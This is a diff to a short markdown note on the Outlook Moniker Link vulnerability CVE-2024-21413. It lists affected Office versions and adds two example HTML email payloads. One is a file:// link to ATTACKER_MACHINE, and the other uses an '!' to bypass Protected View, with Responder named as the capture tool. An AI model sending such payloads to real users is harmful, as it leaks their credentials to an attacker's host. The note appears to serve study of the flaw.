@@ -1,5 +1,7 @@
 ## Moniker Link CVE-2024-21413
 
+### Tool: Responder, SMTP client
+
 ### Severity: Critical
 
 ### Scoring: 9.8
@@ -15,3 +17,12 @@
 #### 3) Microsoft Office 2019 (Version: from 16.0.1)
 
 #### 4) Microsoft Office 2016 (Version: from 16.0.0 before 16.0.5435.1001)
+
+### Example payload: (Moniker Link type: file://)
+
+#### 1) <p><a href="file://ATTACKER_MACHINE/test">Click me</a></p<
+
+### Outlook's Protected view bypass: (Special character: !)
+
+#### 1) <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p<
+
